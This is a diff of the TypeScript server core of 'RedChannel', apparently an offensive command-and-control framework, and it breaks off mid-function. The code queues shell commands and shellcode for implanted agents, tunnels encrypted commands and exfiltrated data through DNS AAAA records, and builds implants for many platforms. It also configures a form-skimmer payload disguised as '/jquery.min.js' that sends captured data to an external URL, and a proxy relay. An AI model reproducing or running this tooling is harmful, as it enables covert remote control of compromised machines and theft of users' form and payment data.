@@ -4,34 +4,16 @@ import axios from "axios";
 import * as crypto from "crypto";
 import * as os from "os";
 import * as path from "path";
-import { spawn, ChildProcessWithoutNullStreams } from "child_process";
-import { emsg } from "../utils/utils";
-import RedChannelCrypto, { CipherModel } from "./crypto";
+import merge from "lodash.merge";
 import ECKey from "ec-key";
-import RedChannelLogger from "./logger";
+import { spawn, ChildProcessWithoutNullStreams } from "child_process";
 
-const RC_VERSION = "0.3.0";
+import { Config, Constants, emsg } from "../utils/utils";
+import Crypto, { CipherModel } from "./crypto";
+import Logger from "./logger";
+import Helper from "./helper";
 
-const DATA_PAD_CHAR = "f";
-const RECORD_DATA_PREFIX = "2001";
-const RECORD_HEADER_PREFIX = "ff00";
-const MAX_DATA_BLOCKS_PER_IP = 6;
-const MAX_RECORDS_PER_COMMAND = 15; // first record is ip header, rest is data
-
-const VALID_CLASS_ID_REGEX = /^-?[\s_a-zA-Z,]+[\s_a-zA-Z0-9-,]*$/;
-const VALID_URL_REGEX = /^http:\/\/\w+(\.\w+)*(:[0-9]+)?\/?(\/[.\w]*)*$/;
-const VALID_ROUTE_REGEX = /^\/[a-zA-Z0-9_\-\.]*$/;
-const VALID_PROXY_DATA = /^[\:\;a-f0-9\.]+$/;
-const VALID_IP_REGEX = /^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/;
-const VALID_HOST_REGEX = /^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$/;
-const VALID_BUILD_TARGET_OS = /^(windows|linux|darwin|android|netbsd|openbsd|freebsd|dragonfly|solaris)$/i;
-const VALID_BUILD_TARGET_ARCH = /^(amd64|arm|arm64|386|ppc64|ppc64le|mipsle|mips|mips64|mips64le)$/i;
-const VALID_IMPLANT_RESOLVER =
-    /^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]):([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$/i;
-
-const DEFAULT_CONF_PATH = "conf/redchannel.conf";
-
-export enum AgentCommands {
+export enum AgentCommand {
     AGENT_SYSINFO = 0x01,
     AGENT_CHECKIN = 0x02,
     AGENT_SHELL = 0x03,
@@ -43,17 +25,72 @@ export enum AgentCommands {
     AGENT_IGNORE = 0xff,
 }
 
+export type C2Config = {
+    domain: string;
+    dns_ip: string;
+    dns_port: number;
+    web_ip: string;
+    web_port: number;
+    interval: number;
+    plaintext_password: string;
+    binary_route: string;
+    web_url: string;
+};
+export type SkimmerConfig = {
+    payload_route: string;
+    data_route: string;
+    url: string;
+    target_classes: string[];
+    target_ids: string[];
+};
+export type ProxyConfig = {
+    enabled: boolean;
+    url: string;
+    key: string;
+    interval: number;
+};
+
+export type ImplantConfig = {
+    os: string;
+    arch: string;
+    resolver: string;
+    interval: number;
+    output_file: string;
+    debug: boolean;
+};
+
+export type RedChannelConfig = {
+    c2: C2Config;
+    skimmer: SkimmerConfig;
+    proxy: ProxyConfig;
+    implant: ImplantConfig;
+    static_dns: { [host: string]: string };
+    debug: boolean;
+};
+
 export interface AgentModel {
-    ident: string;
+    id: string;
     secret?: Buffer;
     keyx?: ECKey;
     lastseen?: number;
     ip?: string;
     channel?: AgentChannel;
     allow_keyx?: boolean;
-    sendq?: Array<string[]>;
-    recvq?: any;
-    ignore?: any;
+    sendq: Array<string[]>;
+    // each agent command has a map of dataId => {chunks, data}
+    recvq: Map<AgentCommand, Map<string, string[]>>;
+}
+
+// agent status hex string value to be appended to DNS response
+export enum AgentStatus {
+    MORE_DATA = "01",
+    DATA_RECEIVED = "02",
+    NO_DATA = "03",
+    ERROR_IMPORTING_KEY = "04",
+    ERROR_DERIVING_SECRET = "05",
+    ERROR_DECRYPTING_MESSAGE = "06",
+    ERROR_GENERATING_KEYS = "07",
+    ERROR_INVALID_MESSAGE = "08",
 }
 
 export enum AgentChannel {
@@ -62,11 +99,10 @@ export enum AgentChannel {
 }
 
 class RedChannel {
-    version = RC_VERSION;
-
-    c2_message_handler: Function;
+    version = Constants.VERSION;
 
     agents: { [agentId: string]: AgentModel };
+    flood: Map<string, NodeJS.Timeout>;
 
     /**
      * available commands for 'help' to display
@@ -95,251 +131,20 @@ class RedChannel {
 
     config_file: string;
 
-    config: any;
+    config: RedChannelConfig;
 
     // the absolute path to the app directory
     app_root: string = path.resolve("./");
 
-    log: RedChannelLogger;
+    log: Logger;
 
-    crypto: RedChannelCrypto;
+    crypto: Crypto;
 
-    constructor(c2_message_handler: Function) {
-        this.log = new RedChannelLogger();
-
-        // c2 message handler is called with mock DNS data when fetching from proxy
-        // TODO: this is ugly, change it
-        this.c2_message_handler = c2_message_handler;
+    constructor(debug: boolean, domain: string, config: any, password: string, configFile?: string) {
+        this.log = new Logger();
 
         this.agents = {};
-        this.commands = {
-            agent: {
-                sysinfo: {
-                    params: [],
-                    desc: "get system info",
-                },
-                keyx: {
-                    params: [],
-                    desc: "start a key exchange with the agent",
-                },
-                agents: {
-                    params: [],
-                    desc: "show active agents",
-                },
-                interact: {
-                    params: ["<agent id>"],
-                    desc: "interact with an agent",
-                },
-                shell: {
-                    params: ["<command>"],
-                    desc: "execute a shell command, alias: exec_cmd",
-                },
-                msg: {
-                    params: ["<message>"],
-                    desc: "send an encrypted message to the agent, requires keyx",
-                },
-                shutdown: {
-                    params: ["<agent id>"],
-                    desc: "shutdown the agent, confirm by entering the id, agent will not reconnect",
-                },
-                debug: {
-                    params: [],
-                    desc: "show verbose messages",
-                },
-                help: {
-                    params: [],
-                    desc: "show available commands",
-                },
-                "set proxy_url": {
-                    params: ["<url>"],
-                    desc: "set the proxy url to use (http://proxy.domain.tld/proxy.php)",
-                    validate_regex: VALID_URL_REGEX,
-                },
-                "set proxy_enabled": {
-                    params: ["<1|0>"],
-                    desc: "enable or disable proxy communication",
-                },
-                "set proxy_key": {
-                    params: ["<key>"],
-                    desc: "key to use for proxy communication",
-                },
-                "set interval": {
-                    params: ["<ms>"],
-                    desc: "how often to checkin with the c2 (dns or proxy)",
-                    validate_regex: /^[0-9]+$/,
-                },
-                // "set domain": {
-                //     params: ["<c2.domain.tld>"],
-                //     desc: "set the c2 domain"
-                // },
-                // "set password": {
-                //     params: ["<password>"],
-                //     desc: "set the c2 password"
-                // },
-            },
-            c2: {
-                keyx: {
-                    params: [],
-                    desc: "start key exchange with all agents",
-                },
-                agents: {
-                    params: [],
-                    desc: "show active agents",
-                },
-                interact: {
-                    params: ["<agent id>"],
-                    desc: "interact with an agent",
-                },
-                kill: {
-                    params: ["<agent id>"],
-                    desc: "deletes the agent from memory, agent may reconnect",
-                },
-                debug: {
-                    params: [],
-                    desc: "show verbose messages",
-                },
-                "use skimmer": {
-                    params: [],
-                    desc: "use the skimmer module",
-                },
-                "use proxy": {
-                    params: [],
-                    desc: "use the proxy module",
-                },
-                "use static_dns": {
-                    params: [],
-                    desc: "use the static_dns module to add or remove static dns records",
-                },
-                "use implant": {
-                    params: [],
-                    desc: "use the implant module to build agents",
-                },
-                help: {
-                    params: [],
-                    desc: "show available commands",
-                },
-            },
-            module_common: {
-                reset: {
-                    params: [],
-                    desc: "reset config to .conf values",
-                },
-                config: {
-                    params: [],
-                    desc: "view config",
-                },
-                help: {
-                    params: [],
-                    desc: "show available commands",
-                },
-                back: {
-                    params: [],
-                    desc: "back to main menu",
-                },
-            },
-            skimmer: {
-                generate: {
-                    params: [],
-                    desc: "generate skimmer payload with the specified url and target classes and ids",
-                },
-                "set url": {
-                    params: ["<url>"],
-                    desc: "set the external skimmer c2 url (http://skimmer.url)",
-                    validate_regex: VALID_URL_REGEX,
-                },
-                "set data_route": {
-                    params: ["<route>"],
-                    desc: "set the skimmer url data route (/stats)",
-                    validate_regex: VALID_ROUTE_REGEX,
-                },
-                "set target_classes": {
-                    params: ["<class 1,class 2,class 3>"],
-                    desc: "(optional) target classes with skimmer click handler, separated by comma",
-                    validate_regex: VALID_CLASS_ID_REGEX,
-                },
-                "set target_ids": {
-                    params: ["<id 1,id 2,id 3>"],
-                    desc: "(optional) target ids with skimmer click handler, separated by comma",
-                    validate_regex: VALID_CLASS_ID_REGEX,
-                },
-            },
-            proxy: {
-                fetch: {
-                    params: [],
-                    desc: "force a fetch from the proxy",
-                },
-                generate: {
-                    params: [],
-                    desc: "generate proxy payload with the specified key",
-                },
-                "set url": {
-                    params: ["<url>"],
-                    desc: "set the proxy url to use (http://proxy.domain.tld/proxy.php)",
-                    validate_regex: VALID_URL_REGEX,
-                },
-                "set enabled": {
-                    params: ["<1|0>"],
-                    desc: "enable or disable proxy communication channel",
-                },
-                "set key": {
-                    params: ["<key>"],
-                    desc: "key to use for proxy communication",
-                },
-                "set interval": {
-                    params: ["<ms>"],
-                    desc: "how often to fetch data from proxy, in ms",
-                },
-            },
-            static_dns: {
-                add: {
-                    params: ["<host>", "<ip>"],
-                    desc: "add a static DNS A record",
-                },
-                delete: {
-                    params: ["<host>"],
-                    desc: "delete static DNS A record",
-                },
-            },
-            implant: {
-                build: {
-                    params: ["[os]", "[arch]"],
-                    desc: "build the agent for the target os and arch",
-                },
-                generate: {
-                    params: ["[os]", "[arch]"],
-                    desc: "alias for 'build'",
-                },
-                log: {
-                    params: [],
-                    desc: "show the build log",
-                },
-                "set os": {
-                    params: ["<windows|linux|darwin|...>"],
-                    desc: "set the target os for the build (GOOS)",
-                    validate_regex: VALID_BUILD_TARGET_OS,
-                },
-                "set arch": {
-                    params: ["<amd64|386|arm64|mips|...>"],
-                    desc: "set the target arch for the build (GOARCH)",
-                    validate_regex: VALID_BUILD_TARGET_ARCH,
-                },
-                "set interval": {
-                    params: ["<ms>"],
-                    desc: "set implant c2 query interval",
-                },
-                "set resolver": {
-                    params: ["<ip:port>"],
-                    desc: "set implant resolver ip:port (8.8.8.8:53)",
-                    validate_regex: VALID_IMPLANT_RESOLVER,
-                },
-                "set debug": {
-                    params: ["<1|0>"],
-                    desc: "build debug version of the implant",
-                },
-            },
-        };
-
-        this.master_password = "";
+        this.commands = { ...Helper.Commands() };
 
         this.modules = {
             proxy: {
@@ -373,17 +178,20 @@ class RedChannel {
 
         this.using_module = "";
 
-        this.config_file = DEFAULT_CONF_PATH;
+        this.config_file = configFile ?? Config.DEFAULT_CONFIG_FILE;
 
         // merged with data from config file
         this.config = {
             c2: {
-                domain: "",
+                domain: domain ?? "",
                 dns_ip: "127.0.0.1",
                 dns_port: 53,
                 web_ip: "127.0.0.1",
                 web_port: 4321,
-                agent_interval: 5000,
+                interval: 5000,
+                plaintext_password: "",
+                binary_route: "/agent",
+                web_url: "",
             },
             skimmer: {
                 payload_route: "/jquery.min.js",
@@ -401,25 +209,52 @@ class RedChannel {
             implant: {
                 os: "windows",
                 arch: "amd64",
+                interval: 5000,
+                resolver: "8.8.8.8:53",
+                output_file: "",
+                debug: false,
             },
             static_dns: {},
-            debug: false,
+            debug: debug,
         };
+
+        this.config.c2.plaintext_password = password;
+        this.master_password = crypto.createHash("md5").update(password).digest("hex");
+
+        // read config file and merge with defaults to ensure properties exist
+        try {
+            const configData = JSON.parse(fs.readFileSync(this.config_file).toString());
+            this.config = merge(this.config, merge(configData, config));
+        } catch (ex) {
+            throw new Error(`Error reading configuration file '${this.config_file}': ${emsg(ex)}`);
+        }
+
+        if (!this.config.c2.domain) {
+            throw new Error(`Please specify the c2 domain via cli or config file, see '--help'`);
+        }
 
         this.app_root = __dirname;
 
-        this.crypto = new RedChannelCrypto();
+        this.crypto = new Crypto();
 
         this.interact = null;
+        this.flood = new Map<string, NodeJS.Timeout>();
+
+        if (this.config.proxy.enabled) {
+            this.log.info(`starting proxy checkin at interval: ${this.config.proxy.interval}ms`);
+            this.proxy_fetch_loop();
+        }
     }
 
     init_agent(agent_id, channel: AgentChannel) {
         if (typeof this.agents[agent_id] == "undefined") {
             this.agents[agent_id] = {
-                ident: agent_id,
+                id: agent_id,
                 lastseen: 0,
                 channel: channel,
                 allow_keyx: false,
+                sendq: [],
+                recvq: new Map<AgentCommand, Map<string, string[]>>(),
             };
         }
     }
@@ -437,49 +272,54 @@ class RedChannel {
         if (!agent_id) {
             // broadcast keyx if no agent is specified
             Object.keys(this.agents).forEach((id) => {
-                this.queue_data(id, AgentCommands.AGENT_KEYX, uncompressedPublicKey);
+                this.queue_data(id, AgentCommand.AGENT_KEYX, uncompressedPublicKey);
             });
             return;
         }
 
         if (typeof this.agents[agent_id] != "undefined") {
-            this.queue_data(agent_id, AgentCommands.AGENT_KEYX, uncompressedPublicKey);
+            this.queue_data(agent_id, AgentCommand.AGENT_KEYX, uncompressedPublicKey);
         }
         return;
     }
 
     command_shutdown() {
         if (!this.interact) return;
-        this.queue_data(this.interact.ident, AgentCommands.AGENT_SHUTDOWN, this.aesEncryptedPayload(crypto.randomBytes(6).toString("hex")));
+
+        this.queue_data(this.interact.id, AgentCommand.AGENT_SHUTDOWN, this.encryptPayload(crypto.randomBytes(6).toString("hex")));
     }
 
     command_shell(shell_cmd) {
         if (!this.interact) return;
-        this.queue_data(this.interact.ident, AgentCommands.AGENT_SHELL, shell_cmd);
+
+        this.queue_data(this.interact.id, AgentCommand.AGENT_SHELL, shell_cmd);
     }
 
     command_exec_sc(shellcode) {
         if (!this.interact) return;
-        this.queue_data(this.interact.ident, AgentCommands.AGENT_EXEC_SC, shellcode);
+
+        this.queue_data(this.interact.id, AgentCommand.AGENT_EXEC_SC, shellcode);
     }
 
     // agent must be able to decrypt the tag to execute shutdown
     command_sysinfo() {
         if (!this.interact) return;
-        this.queue_data(this.interact.ident, AgentCommands.AGENT_SYSINFO, this.aesEncryptedPayload(crypto.randomBytes(6).toString("hex")));
+
+        this.queue_data(this.interact.id, AgentCommand.AGENT_SYSINFO, this.encryptPayload(crypto.randomBytes(6).toString("hex")));
     }
     /**
      * config format:
      *
-     * agent_interval=5000
+     * interval=5000
      * c2_domain=domain1[,domain2?]
      */
     command_set_config(config: string) {
         if (!this.interact) return;
-        this.queue_data(this.interact.ident, AgentCommands.AGENT_SET_CONFIG, config);
+
+        this.queue_data(this.interact.id, AgentCommand.AGENT_SET_CONFIG, config);
     }
 
-    aesEncryptedPayload(data: string): string {
+    encryptPayload(data: string): string {
         if (!this.interact) return "";
 
         const buffer = Buffer.from(data);
@@ -498,39 +338,38 @@ class RedChannel {
     queue_data(agentId, command, data) {
         const agent = this.agents[agentId];
 
-        let dataPayload = this.aesEncryptedPayload(data);
+        let dataPayload = this.encryptPayload(data);
         if (dataPayload.length == 0) dataPayload = crypto.randomBytes(2).toString("hex");
 
-        let dataBlocks = dataPayload.match(/[a-f0-9]{1,4}/g);
+        const dataBlocks = dataPayload.match(/[a-f0-9]{1,4}/g);
         if (!dataBlocks) return;
 
         // prettier-ignore
         const totalRecords =
-            Math.floor(dataBlocks.length / MAX_DATA_BLOCKS_PER_IP) +
-            (dataBlocks.length % MAX_DATA_BLOCKS_PER_IP == 0 ? 0 : 1);
+            Math.floor(dataBlocks.length / Config.MAX_DATA_BLOCKS_PER_IP) +
+            (dataBlocks.length % Config.MAX_DATA_BLOCKS_PER_IP == 0 ? 0 : 1);
 
         // prettier-ignore
         const totalCommands =
-            Math.floor(totalRecords / MAX_RECORDS_PER_COMMAND) +
-            (totalRecords % MAX_RECORDS_PER_COMMAND == 0 ? 0 : 1);
+            Math.floor(totalRecords / Config.MAX_RECORDS_PER_COMMAND) +
+            (totalRecords % Config.MAX_RECORDS_PER_COMMAND == 0 ? 0 : 1);
 
         const dataId = crypto.randomBytes(2).toString("hex");
 
         let records: string[] = [];
-        // let addedCommands = 1;
         let paddedBytes = 0;
         let record = "";
         for (let recordNum = 0; recordNum < totalRecords; recordNum++) {
-            const blocksPerIp = dataBlocks.splice(0, MAX_DATA_BLOCKS_PER_IP);
+            const blocksPerIp = dataBlocks.splice(0, Config.MAX_DATA_BLOCKS_PER_IP);
 
             // pad the last block with trailing Fs
             const lastAddedBlock = blocksPerIp.slice(-1)[0];
             paddedBytes = 4 - lastAddedBlock.length;
             blocksPerIp[blocksPerIp.length - 1] = this.pad_tail(lastAddedBlock, 4);
-            if (blocksPerIp.length < MAX_DATA_BLOCKS_PER_IP) {
-                const blocksNeeded = MAX_DATA_BLOCKS_PER_IP - blocksPerIp.length;
+            if (blocksPerIp.length < Config.MAX_DATA_BLOCKS_PER_IP) {
+                const blocksNeeded = Config.MAX_DATA_BLOCKS_PER_IP - blocksPerIp.length;
                 for (let j = 0; j < blocksNeeded; j++) {
-                    blocksPerIp.push(DATA_PAD_CHAR.repeat(4));
+                    blocksPerIp.push(Config.DATA_PAD_CHAR.repeat(4));
                     paddedBytes += 4;
                 }
             }
@@ -540,17 +379,17 @@ class RedChannel {
 
             // prettier-ignore
             record =
-                RECORD_DATA_PREFIX +
+            Config.RECORD_DATA_PREFIX +
                 ":" +
                 this.pad_zero(recordNum.toString(16), 4) +
                 ":" +
                 blocksPerIp.join(":");
             records.push(record);
 
-            if (totalCommands > 1 && (records.length == MAX_RECORDS_PER_COMMAND - 1 || recordNum == totalRecords - 1)) {
+            if (totalCommands > 1 && (records.length == Config.MAX_RECORDS_PER_COMMAND - 1 || recordNum == totalRecords - 1)) {
                 // prettier-ignore
                 record =
-                    RECORD_HEADER_PREFIX +
+                Config.RECORD_HEADER_PREFIX +
                     ":" +
                     dataId +
                     ":" +
@@ -562,16 +401,15 @@ class RedChannel {
                     "0000:0000:0000:0001";
 
                 records.unshift(record);
-                // addedCommands++;
 
-                agent.sendq?.push(records);
+                agent.sendq.push(records);
                 records = [];
             }
         }
         if (totalCommands == 1) {
             // prettier-ignore
             record =
-                RECORD_HEADER_PREFIX +
+            Config.RECORD_HEADER_PREFIX +
                 ":" +
                 dataId +
                 ":" +
@@ -585,12 +423,12 @@ class RedChannel {
         }
 
         // set to false after keyx is received and there are no more keyx in sendq
-        if (command == AgentCommands.AGENT_KEYX) agent.allow_keyx = true;
+        if (command == AgentCommand.AGENT_KEYX) agent.allow_keyx = true;
 
         if (records.length > 0) {
             agent.sendq?.push(records);
-            if (this.config.proxy.enabled && agent.channel == "proxy") {
-                this.send_to_proxy(agentId, records);
+            if (this.config.proxy.enabled && agent.channel == AgentChannel.PROXY) {
+                this.send_to_proxy(agent.id, records);
 
                 // cleanup sendq if proxying to agent
                 agent.sendq = [];
@@ -635,16 +473,16 @@ class RedChannel {
         return axios
             .post(this.config.proxy.url, data)
             .then((result) => this.process_proxy_data(result.data))
-            .catch((e) => {
-                throw new Error(`proxy fetch failed: ${e.message}`);
+            .catch((ex) => {
+                this.log.error(`proxy fetch failed: ${emsg(ex)}`);
             });
     }
 
     process_proxy_data(proxyData: string) {
         // we expect the proxy to respond with ERR 1, or similar
-        // this.ui.debug(`proxy response:\n${proxyData}`);
+        // this.this.log.debug(`proxy response:\n${proxyData}`);
         if (proxyData.length <= 5) throw new Error(`unexpected response (too small)`);
-        if (!VALID_PROXY_DATA.test(proxyData)) throw new Error(`invalid incoming proxy data`);
+        if (!Constants.VALID_PROXY_DATA.test(proxyData)) throw new Error(`invalid incoming proxy data`);
 
         // grab proxy response and build mock dns queries
         let data = proxyData.replace(/;$/, "").split(";");
@@ -665,7 +503,7 @@ class RedChannel {
                 answer: [],
                 end: () => {},
             };
-            this.c2_message_handler(req, res);
+            this.c2MessageHandler(req, res);
         });
     }
 
@@ -673,7 +511,7 @@ class RedChannel {
         return "0".repeat(max_len - proxyData.length) + proxyData;
     }
     pad_tail(proxyData, max_len) {
-        return proxyData + DATA_PAD_CHAR.repeat(max_len - proxyData.length);
+        return proxyData + Config.DATA_PAD_CHAR.repeat(max_len - proxyData.length);
     }
 
     is_command_in_sendq(agent_id, command) {
@@ -681,7 +519,7 @@ class RedChannel {
         var cmd = this.pad_zero(command.toString(16), 2);
 
         this.agents[agent_id].sendq?.forEach((q) => {
-            if (q[0].substring(0, 4) == RECORD_HEADER_PREFIX) {
+            if (q[0].substring(0, 4) == Config.RECORD_HEADER_PREFIX) {
                 if (q[0].substring(12, 14) == cmd) {
                     is = true;
                     return;
@@ -692,7 +530,7 @@ class RedChannel {
     }
 
     make_ip_string(last_byte) {
-        return `${RECORD_HEADER_PREFIX}:0000:${AgentCommands.AGENT_IGNORE.toString(16)}01:0000:0000:dead:c0de:00${last_byte}`;
+        return `${Config.RECORD_HEADER_PREFIX}:0000:${AgentCommand.AGENT_IGNORE.toString(16)}01:0000:0000:dead:c0de:00${last_byte}`;
     }
 
     /**
@@ -715,20 +553,16 @@ class RedChannel {
     get_all_agents(prepend = "") {
         const agents: string[] = [];
         Object.keys(this.agents).forEach((a) => {
-            agents.push(prepend + this.agents[a].ident);
+            agents.push(prepend + this.agents[a].id);
         });
         return agents;
     }
 
-    get_agent(agent_id): AgentModel {
-        let agent: AgentModel = { ident: "" };
-        Object.keys(this.agents).forEach((a) => {
-            if (a == agent_id) {
-                agent = this.agents[a];
-                return;
-            }
-        });
-        return agent;
+    get_agent(agentId): AgentModel | null {
+        for (const id in this.agents) {
+            if (id == agentId) return this.agents[id];
+        }
+        return null;
     }
 
     /**
@@ -834,8 +668,8 @@ class RedChannel {
         let host = params[0];
         let ip = params[1];
 
-        if (!VALID_HOST_REGEX.test(host)) throw new Error(`invalid host value, see 'help'`);
-        if (!VALID_IP_REGEX.test(ip)) throw new Error(`invalid ip value, see 'help'`);
+        if (!Constants.VALID_HOST_REGEX.test(host)) throw new Error(`invalid host value, see 'help'`);
+        if (!Constants.VALID_IP_REGEX.test(ip)) throw new Error(`invalid ip value, see 'help'`);
 
         this.config.static_dns[host] = ip;
         return { message: `added static dns record ${host} = ${ip}` };
@@ -845,7 +679,7 @@ class RedChannel {
         if (params.length == 0) throw new Error(`please enter a host, see 'help'"`);
 
         const host = params[0];
-        if (!VALID_HOST_REGEX.test(host)) throw new Error(`invalid host value, see 'help'`);
+        if (!Constants.VALID_HOST_REGEX.test(host)) throw new Error(`invalid host value, see 'help'`);
 
         delete this.config.static_dns[host];
         return { message: `deleted static dns record ${host}` };
@@ -883,8 +717,8 @@ class RedChannel {
         const targetArch = params[1] ?? this.config.implant.arch;
         const debug = this.config.implant.debug;
 
-        if (!VALID_BUILD_TARGET_OS.test(targetOs)) throw new Error(`invalid os value, must be supported by Go (GOOS)`);
-        if (!VALID_BUILD_TARGET_ARCH.test(targetArch)) throw new Error(`invalid arch value, must be supported by Go (GOARCH)`);
+        if (!Constants.VALID_BUILD_TARGET_OS.test(targetOs)) throw new Error(`invalid os value, must be supported by Go (GOOS)`);
+        if (!Constants.VALID_BUILD_TARGET_ARCH.test(targetArch)) throw new Error(`invalid arch value, must be supported by Go (GOARCH)`);
 
         try {
             this.implant_build_gen_config();
@@ -955,6 +789,306 @@ class RedChannel {
         }
 
         return { message: log_data, error: false };
+    }
+
+    /**
+     req: {
+         connection: {
+             remoteAddress: '127.0.0.1',
+            type: 'AAAA'
+        }
+    }
+    res: {
+        question[0]: {
+            type: 'AAAA',
+            name: 'dns.query.tld'
+        },
+        answer: [],
+        end: function(){}
+    }
+    */
+    c2MessageHandler(req, res) {
+        var question = res.question[0];
+        var hostname = question.name as string;
+        var ttl = 300; // Math.floor(Math.random() 3600)
+        let channel = question.type === "PROXY" ? AgentChannel.PROXY : AgentChannel.DNS;
+
+        if (this.config.static_dns[hostname]) {
+            this.log.info(`static_dns: responding to request for host: '${hostname}' with ip '${this.config.static_dns[hostname]}'`);
+            res.answer.push({
+                name: hostname,
+                type: "A",
+                data: this.config.static_dns[hostname],
+                ttl: ttl,
+            });
+            return res.end();
+        }
+
+        if (!hostname.endsWith(this.config.c2.domain)) {
+            this.log.debug(`unknown c2 domain, ignoring query for: ${hostname}`);
+            return res.end();
+        }
+        this.log.debug(`query: ${req.connection.remoteAddress}:${req.connection.type} ${question.type} ${question.name}`);
+
+        if (question.type !== "AAAA" && question.type !== "PROXY") {
+            this.log.debug(`ignoring non-AAAA/non-PROXY query ${req.connection.remoteAddress}:${req.connection.type} ${question.type} ${question.name}`);
+            return res.end();
+        }
+
+        const segments = hostname.slice(0, hostname.length - this.config.c2.domain.length).split(".");
+        if (segments.length < Config.EXPECTED_DATA_SEGMENTS) {
+            this.log.error(`invalid message, not enough data segments (${segments.length}, expected ${Config.EXPECTED_DATA_SEGMENTS}): ${hostname}`);
+
+            return res.end();
+        }
+
+        // used to prevent flooding
+        const randId: string = segments[0];
+        const agentId: string = segments[1];
+        const floodId = agentId + randId;
+        if (!this.agents[agentId]) {
+            this.init_agent(agentId, channel);
+            this.log.warn(`first ping from agent ${agentId}, src: ${req.connection.remoteAddress}, channel: ${this.agents[agentId].channel}`);
+
+            if (!this.crypto.privateKey) this.crypto.generate_keys();
+
+            this.log.warn(`keyx started with agent ${agentId}`);
+            this.command_keyx(agentId);
+        }
+        this.agents[agentId].lastseen = Math.floor(Date.now() / 1000);
+        this.agents[agentId].ip = req.connection.remoteAddress;
+
+        let command = 0;
+        try {
+            command = parseInt(segments[2].slice(0, 2), 16);
+        } catch (ex) {
+            this.log.error(`failed to parse command: ${emsg(ex)}`);
+
+            return res.end();
+        }
+
+        // no need to check the incoming data, just send a queued up msg
+        if (command == AgentCommand.AGENT_CHECKIN) {
+            if (channel !== this.agents[agentId].channel) {
+                this.log.warn(`agent ${agentId} switching channel from ${this.agents[agentId].channel} to ${channel}`);
+                this.agents[agentId].channel = channel;
+            }
+
+            if (this.agents[agentId].sendq?.length == 0) {
+                // 03 means no data to send
+                this.log.debug(`agent ${agentId} checking in, no data to send`);
+                const noDataStatus = this.make_ip_string(AgentStatus.NO_DATA);
+                res.answer.push({
+                    name: hostname,
+                    type: "AAAA",
+                    data: noDataStatus,
+                    ttl: ttl,
+                });
+
+                return res.end();
+            }
+
+            // we have already responded to this agent and rand_id combination
+            // reset the flood protection timeout
+            if (this.flood.has(floodId)) {
+                clearTimeout(this.flood[floodId]);
+                this.flood.set(
+                    floodId,
+                    setTimeout(() => {
+                        this.flood.delete(floodId);
+                    }, Config.FLOOD_PROTECTION_TIMEOUT_MS)
+                );
+
+                this.log.warn(`ignoring flood from agent: ${agentId}, rid: ${randId}, command: ${command}`);
+                return res.end();
+            }
+
+            this.log.debug(`agent ${agentId} checking in, sending next queued command`);
+            const records = this.agents[agentId].sendq.shift();
+            if (records) {
+                records.forEach((record) => {
+                    res.answer.push({
+                        name: hostname,
+                        type: "AAAA",
+                        data: record,
+                        ttl: ttl,
+                    });
+                });
+            }
+
+            // flood protection, if the agent dns resolver retries a query, data can be lost
+            // so we ignore retries
+            this.flood.set(
+                floodId,
+                setTimeout(() => {
+                    this.flood.delete(floodId);
+                }, Config.FLOOD_PROTECTION_TIMEOUT_MS)
+            );
+
+            return res.end();
+        }
+
+        let currentChunk = 0;
+        let totalChunks = 0;
+        try {
+            currentChunk = parseInt(segments[2].slice(2, 4), 16);
+            totalChunks = parseInt(segments[2].slice(4, 6), 16);
+        } catch (ex) {
+            return this.log.error(`message: invalid chunk numbers, current: ${currentChunk}, total: ${totalChunks}`);
+        }
+
+        const dataId: string = segments[3];
+        if (dataId.length < 2) return this.log.error(`message: invalid data id: ${dataId}`);
+
+        const chunk: string = segments[4];
+        if (chunk.length < 2) return this.log.error(`message: invalid chunk: ${chunk}`);
+
+        if (!this.agents[agentId].recvq.has(command)) {
+            this.agents[agentId].recvq.set(command, new Map<string, string[]>());
+        }
+
+        // we use ! to tell typescript we are smarter than it
+        const recvqCommand = this.agents[agentId].recvq.get(command)!;
+        if (!recvqCommand.get(dataId)) {
+            recvqCommand.set(dataId, new Array(totalChunks));
+        }
+
+        const recvqDataId = recvqCommand.get(dataId)!;
+
+        recvqDataId[currentChunk] = chunk;
+        recvqCommand.set(dataId, recvqDataId);
+        // count non undefined data array entries
+        // since data is not sent in sequence, array may be [undefined, undefined, 123, undefined, 321]
+        if (this.count_data_chunks(recvqDataId) == totalChunks) {
+            const dataChunks = recvqDataId.join("");
+            recvqCommand.delete(dataId);
+
+            // process data, send back status (0f = failed, 02 = success)
+            const processStatus = this.process_dns_data(agentId, command, dataChunks);
+            if (processStatus) {
+                res.answer.push({
+                    name: hostname,
+                    type: "AAAA",
+                    data: this.make_ip_string(processStatus),
+                    ttl: ttl,
+                });
+            }
+
+            return res.end();
+        }
+
+        // last byte 01 indicates more data is expected
+        const moreData = this.make_ip_string("01");
+        res.answer.push({
+            name: hostname,
+            type: "AAAA",
+            data: moreData,
+            ttl: ttl,
+        });
+
+        /*if (question.type == 'CNAME') {
+        res.answer.push({ name: hostname, type: 'CNAME', data: "x.domain.tld", 'ttl': ttl })
+        }
+        if (question.type == 'A') {
+            res.answer.push({ name: hostname, type: 'A', data: "1.1.1." + length, 'ttl': ttl })
+        }*/
+        return res.end();
+    }
+
+    process_dns_data(agentId, command, data): AgentStatus {
+        let plaintext = "";
+        switch (command) {
+            case AgentCommand.AGENT_KEYX:
+                if (!this.agents[agentId].allow_keyx) {
+                    this.log.error(`incoming keyx from ${agentId} not allowed, initiate keyx first`);
+                    break;
+                }
+
+                if (!this.crypto.privateKey) {
+                    try {
+                        this.crypto.generate_keys();
+                    } catch (ex) {
+                        this.log.error(`failed to generate keys: ${emsg(ex)}`);
+                        return AgentStatus.ERROR_GENERATING_KEYS;
+                    }
+                }
+
+                const agentPubkey = Buffer.from(data, "hex");
+                try {
+                    this.agents[agentId].keyx = this.crypto.import_uncompressed_pubkey(agentPubkey);
+                } catch (ex) {
